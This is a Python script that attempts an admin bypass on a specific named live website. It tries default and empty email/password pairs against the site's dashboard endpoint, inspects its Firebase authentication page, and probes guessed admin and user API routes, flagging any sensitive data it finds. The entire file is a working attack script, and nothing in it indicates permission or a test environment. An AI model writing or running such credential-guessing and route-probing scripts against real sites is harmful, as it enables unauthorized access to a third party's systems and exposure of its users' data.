#!/usr/bin/env python3
import requests

def test_real_admin_bypass():
    print("🎯 TESTING REAL ADMIN BYPASS - NO GIMMICKS")
    print("=" * 60)
    
    target = "https://uplinkai.in/"
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Test 1: Check if we can access the actual dashboard
    print("1. Testing real dashboard access:")
    try:
        response = session.get(target + "dashboard", timeout=10)
        print(f"   Status: {response.status_code}")
        print(f"   Content Length: {len(response.text)} bytes")
        
        # Extract title and check for admin content
        import re
        title_match = re.search(r'<title[^>]*>([^<]+)</title>', response.text, re.IGNORECASE)
        if title_match:
            title = title_match.group(1).strip()
            print(f"   📄 Title: '{title}'")
            
            if 'Dashboard' in title:
                print("   ✅ REAL DASHBOARD CONFIRMED!")
                
                # Look for actual dashboard content
                dashboard_content = [
                    'dashboard', 'resume builder', 'management', 'control panel',
                    'user management', 'analytics', 'statistics', 'admin panel'
                ]
                
                found_content = []
                for content in dashboard_content:
                    if content in response.text.lower():
                        found_content.append(content)
                
                if found_content:
                    print(f"   🎯 Dashboard features found: {found_content[:3]}")
                else:
                    print("   ❓ No clear dashboard features found")
            else:
                print("   ❓ Not a dashboard page")
        
    except Exception as e:
        print(f"   ❌ Error: {e}")
    
    # Test 2: Try to access admin with actual bypass techniques
    print("\n2. Testing real admin bypass techniques:")
    
    # Test Firebase authentication bypass
    print("\n   Testing Firebase auth bypass...")
    firebase_payloads = [
        {'email': 'admin@uplinkai.in', 'password': 'admin123'},
        {'email': 'test@test.com', 'password': 'test123'},
        {'email': '', 'password': ''},
        {'email': 'admin@uplinkai.in', 'password': ''},
        {'email': '', 'password': 'admin123'}
    ]
    
    for i, payload in enumerate(firebase_payloads):
        try:
            print(f"\n     Attempt {i+1}: {payload}")
            
            # Try to access dashboard with fake credentials
            response = session.post(
                target + "dashboard",
                data=payload,
                timeout=10,
                allow_redirects=True
            )
            
            print(f"       Status: {response.status_code}")
            print(f"       URL: {response.url}")
            
            # Check if we got real admin content
            if 'dashboard' in response.text.lower() and response.status_code == 200:
                print("       🚨 POTENTIAL DASHBOARD ACCESS!")
                
                # Extract title
                title_match = re.search(r'<title[^>]*>([^<]+)</title>', response.text, re.IGNORECASE)
                if title_match:
                    title = title_match.group(1).strip()
                    print(f"       📄 Title: '{title}'")
                    if 'Dashboard' in title:
                        print("       ✅ REAL DASHBOARD ACCESS CONFIRMED!")
                
        except Exception as e:
            print(f"       ❌ Error: {e}")
    
    # Test 3: Check for actual authentication state
    print("\n3. Testing authentication state:")
    
    # Check if Firebase auth is actually working
    try:
        auth_response = session.get(target + "auth", timeout=10)
        
        # Look for Firebase auth state
        if 'firebase.auth' in auth_response.text.lower():
            print("   🔔 Firebase Authentication detected")
            
            # Check for auth state indicators
            auth_states = [
                'user signed in', 'auth.currentUser', 
                'user.email', 'user.displayName', 'auth state'
            ]
            
            for state in auth_states:
                if state in auth_response.text.lower():
                    print(f"   📊 Auth state found: {state}")
        
        # Check for actual authentication requirements
        if 'sign in' in auth_response.text.lower() or 'login' in auth_response.text.lower():
            print("   🔒 Authentication required")
        else:
            print("   ✅ No authentication required")
            
    except Exception as e:
        print(f"   ❌ Error: {e}")
    
    # Test 4: Try to access protected routes without authentication
    print("\n4. Testing protected route access:")
    
    protected_routes = [
        '/api/admin',
        '/api/users',
        '/api/settings',
        '/admin/api',
        '/dashboard/api'
    ]
    
    for route in protected_routes:
        try:
            print(f"\n   Testing: {route}")
            response = session.get(target + route.lstrip('/'), timeout=10)
            
            print(f"     Status: {response.status_code}")
            print(f"     Length: {len(response.text)}")
            
            if response.status_code == 200:
                print("     🚨 PROTECTED ROUTE ACCESSIBLE!")
                
                # Check for sensitive data
                sensitive_data = ['users', 'passwords', 'emails', 'admin']
                found_data = []
                
                for data in sensitive_data:
                    if data in response.text.lower():
                        found_data.append(data)
                
                if found_data:
                    print(f"     🚨 Sensitive data exposed: {found_data}")
            else:
                print("     ✅ Protected route properly secured")
                
        except Exception as e:
            print(f"     ❌ Error: {e}")

if __name__ == "__main__":
    test_real_admin_bypass()
